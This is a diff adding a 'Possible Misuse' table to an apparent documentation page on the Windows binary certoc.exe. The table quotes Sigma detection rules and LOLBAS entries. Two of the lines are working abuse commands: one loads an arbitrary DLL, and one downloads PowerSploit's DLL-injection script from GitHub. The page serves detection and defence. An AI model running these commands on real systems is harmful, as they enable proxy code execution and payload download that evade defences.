@@ -99,6 +99,22 @@ C:\Windows\System32\ucrtbase.dll |
 * VirusTotal Link: https://www.virustotal.com/gui/file/debc4f3e7b3d7aa72763170660ec9382021935e675f3baa5e1a585b3c94fcd73/detection/
 
 
+## Possible Misuse
+
+*The following table contains possible examples of `certoc.exe` being misused. While `certoc.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*
+
+Source | Source File | Example | License
+-- | -- | -- | --
+[sigma](https://github.com/Neo23x0/sigma) | [process_creation_certoc_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_certoc_execution.yml) | `title: Suspicious Load DLL via CertOC.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [process_creation_certoc_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_certoc_execution.yml) | `description: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [process_creation_certoc_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_certoc_execution.yml) | `Image\|endswith: '\certoc.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `Name: CertOC.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Command: certoc.exe -LoadDLL "C:\test\calc.dll"`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Path: c:\windows\system32\certoc.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Path: c:\windows\syswow64\certoc.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- IOC: Unsigned DLL load via certoc.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- IOC: Network connection via certoc.exe`{:.highlight .language-yaml} | 
 
 
 
